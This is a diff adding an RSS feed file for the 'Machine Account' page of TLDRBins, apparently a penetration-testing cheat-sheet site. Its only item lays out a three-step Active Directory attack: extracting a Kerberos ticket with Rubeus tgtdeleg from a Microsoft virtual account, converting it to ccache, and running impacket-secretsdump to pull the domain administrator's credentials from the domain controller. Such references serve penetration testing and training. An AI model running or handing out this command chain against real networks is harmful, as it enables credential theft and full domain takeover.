@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Machine Account on TLDRBins</title>
+    <link>https://tldrbins.github.io/@machine-account/</link>
+    <description>Recent content in Machine Account on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@machine-account/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Machine Account</title>
+      <link>https://tldrbins.github.io/machine_account/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/machine_account/</guid>
+      <description> Abuse #1: Microsoft virtual account 1. Create a ticket from Microsoft virtual account .\rubeus.exe tgtdeleg /nowrap 2. Convert kirbi to ccache (Back to Linux) RubeusToCcache&#xA;python3 rubeustoccache.py &amp;lt;BASE64_TICKET&amp;gt; secrets.kirbi secrets.ccache 3. Secrets Dump export KRB5CCNAME=secrets.ccache sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-secretsdump -k -no-pass -just-dc-user administrator </description>
+    </item>
+  </channel>
+</rss>
